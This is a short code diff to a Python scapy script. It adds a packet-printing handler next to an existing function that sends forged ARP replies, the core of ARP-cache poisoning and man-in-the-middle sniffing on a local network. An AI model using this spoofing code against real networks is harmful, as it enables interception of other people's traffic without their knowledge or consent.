@@ -22,6 +22,9 @@ def get_MAC(target_ip):
 def spoof(target_ip,target_mac,spoof_ip):
     spoofed_arp_packet = scapy.ARP(pdst=target_ip,hwdst=target_mac,psrc=spoof_ip, op="is-at")
     scapy.send(spoofed_arp_packet, verbose=0)
+    
+def packet_handle(packet):
+    print(packet.summary())
 
 
 def main():
